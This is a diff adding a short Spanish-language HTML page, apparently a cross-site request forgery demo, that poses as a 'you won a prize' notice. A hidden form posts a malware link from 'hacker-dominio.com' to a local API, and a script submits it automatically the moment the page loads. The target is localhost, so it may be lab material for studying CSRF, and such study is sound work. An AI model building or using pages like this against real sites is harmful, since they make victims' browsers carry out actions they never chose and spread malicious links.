@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>¡Premio Seguro!</title>
+</head>
+<body>
+    <h1>¡Felicidades, eres el visitante 1.000.000!</h1>
+    <p>Reclamando tu premio...</p>
+
+    <form id="csrf-form" action="http://localhost:3000/api/links" method="POST" style="display: none;">
+        <input type="hidden" name="url" value="http://hacker-dominio.com/malware">
+        <input type="hidden" name="description" value="¡Has sido hackeado por CSRF!">
+    </form>
+
+    <script>
+        // En cuanto la víctima abre esta página, el formulario se envía en silencio
+        window.onload = function() {
+            document.getElementById('csrf-form').submit();
+        }
+    </script>
+</body>
+</html>
